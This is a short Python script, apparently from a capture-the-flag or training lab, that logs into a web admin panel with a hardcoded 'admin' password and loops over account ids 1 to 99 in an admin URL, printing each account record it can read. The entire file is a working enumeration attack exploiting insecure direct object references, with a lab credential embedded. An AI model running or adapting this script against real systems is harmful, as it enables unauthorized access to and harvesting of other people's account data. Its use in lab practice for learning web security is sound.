#! /usr/bin/env python3

import requests

base_url = 'http://<MACHINE_IP>'

# Login
session = requests.Session()
session.post(f'{base_url}/cdn-cgi/login/index.php', data={'username': 'admin', 'password': 'MEGACORP_4dm1n!!'})


for index in range(1, 100):
	print(f'Index: {index} --> ', end='')
	response = session.get(f'{base_url}/cdn-cgi/login/admin.php?content=accounts&id={index}')

	if(response.ok):
		parsed_response = response.text.split('<table>')[1].split('</table')[0]
		if(len(parsed_response) > 90):
			print(parsed_response)
		else:
			print('Not exists')
	else:
		print('Error')
